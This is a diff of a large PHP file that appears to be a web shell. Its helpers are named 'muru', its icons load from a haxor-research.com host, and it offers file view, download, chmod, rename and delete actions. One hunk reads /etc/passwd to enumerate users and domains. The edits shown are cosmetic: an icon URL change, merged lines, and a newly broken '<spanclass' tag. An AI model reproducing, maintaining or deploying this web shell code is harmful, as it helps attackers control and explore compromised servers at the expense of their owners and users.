@@ -1224,7 +1224,7 @@ function showAnimation($name){
 	return '-webkit-animation: '.$name.' 800ms ease-in-out forwards;-moz-animation: '.$name.' 800ms ease-in-out forwards;-ms-animation: '.$name.' 800ms ease-in-out forwards;animation: '.$name.' 800ms ease-in-out forwards;';
 }
 function __showicon($r){
-	$s['btn']='https://storage.haxor-research.com/icon/slime.png';
+	$s['btn']='https://storage.haxor-research.com/icon/loader.webp';
 	$s['murumini']='https://storage.haxor-research.com/icon/slime.png';
 	$s['loader']='c';
 	//return 'data:image/png;base64,'.__get_resource($s[$r]);
@@ -3003,7 +3003,7 @@ if(substr($_POST['muru1'], 0, 7) == "phar://"){
 }else{
 	$muru_file_directory = str_replace("//", "/",($chdir_fals?"":$_POST['c'].'/').$_POST['muru1']);
 }
-echo '<div style="overflow: hidden;white-space: nowrap;text-overflow: ellipsis;"><span class="editor_file_info_vars">Name:</span> '.htmlspecialchars(basename($muru1_decoded)).' <span class="editor_file_info_vars">Size:</span> '.muruSize($filesize).' <span class="editor_file_info_vars">Permission:</span> '.$permcolor.' <span class="editor_file_info_vars">Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].' <span class="editor_file_info_vars">Directory:</span> '.dirname($muru_file_directory).'</div>';
+echo '<div style="overflow: hidden;white-space: nowrap;text-overflow: ellipsis;"><span class="editor_file_info_vars">Name:</span> '.htmlspecialchars(basename($muru1_decoded)).' <span class="editor_file_info_vars">Size:</span> '.muruSize($filesize).' <span class="editor_file_info_vars">Permission:</span> '.$permcolor.' <span class="editor_file_info_vars">Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].' <spanclass="editor_file_info_vars">Directory:</span> '.dirname($muru_file_directory).'</div>';
 if(empty($_POST['muru2']))$_POST['muru2'] = 'view';
 if(!_muru_is_dir($_POST['muru1'])){
 $m = array('View', 'Download', 'Highlight', 'Chmod', 'Rename', 'Touch', 'Delete', 'Image', 'Hexdump');
@@ -4318,8 +4318,7 @@ $state = $domains["state"];
 $is_posix = function_exists("posix_getpwuid") && function_exists("fileowner");
 $can_runcmd = _muru_can_runCommand(false,false);
 if(!$is_posix && !$can_runcmd){
-	$anonymous = true;
-	$anony_domains = $domains["lines"];
+	$anonymous = true;$anony_domains = $domains["lines"];
 	$lines = _muru_file('/etc/passwd');
 }
 echo $table_header;
@@ -6135,8 +6134,7 @@ if (!function_exists('json_encode')){
         }
         $isList = true;
         for ($i = 0, reset($a); $i < count($a); $i++, next($a))
-        {
-            if (key($a) !== $i)
+        {if (key($a) !== $i)
             {
                 $isList = false;
                 break;
